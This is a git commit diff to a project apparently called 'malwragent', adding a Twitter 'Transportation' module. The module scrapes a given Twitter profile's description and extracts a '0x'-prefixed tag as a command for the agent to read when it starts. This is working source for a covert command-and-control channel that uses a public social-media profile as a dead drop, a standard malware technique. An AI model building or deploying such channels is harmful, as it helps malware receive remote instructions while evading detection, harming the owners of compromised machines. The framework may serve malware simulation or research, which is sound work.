5c78597533882f0504339a6e7e559dcf1444ee60
michaelschratt <mail@mfs-enterprise.com>
2016-10-31 12:21:57 +0100

    Added Twitter Module

--- malwragent/packages/modules/twitter.py
+++ malwragent/packages/modules/twitter.py
@@ -1,7 +1,12 @@
 # -*- coding: utf-8 -*-
 from __future__ import absolute_import
 
+import requests
+import re
+
+from BeautifulSoup import BeautifulSoup as soupy
 from malwragent.packages.helpers.agentmodule import AgentModule
+from malwragent.packages.helpers.agentmodule import Decorators
 
 __class_name__ = 'Twitter'
 __client_mode__ = True
@@ -11,4 +16,19 @@ __module_type__ = 'Transportation'
 
 class Twitter(AgentModule):
     """provides basic twitter communication routines"""
-    pass
+
+    @Decorators.args(['profile_name'])
+    @Decorators.config(run_first=True)
+    def f_grab_command_from_twitter_profile(self, profile_name):
+        """Grab 0xXXXXXXXX tag from Profile, Tag must match [a-zA-Z0-9_]"""
+        url = 'https://twitter.com/%(profile)s'
+        payload = {
+            'profile': profile_name
+        }
+        html = requests.get(url % payload)
+        soup = soupy(html.text)
+        profile_description = soup.find('meta', {'name': 'description'})['content']
+        match = re.search('(0x)\w+', profile_description)
+        output = match.group(0)
+
+        return output
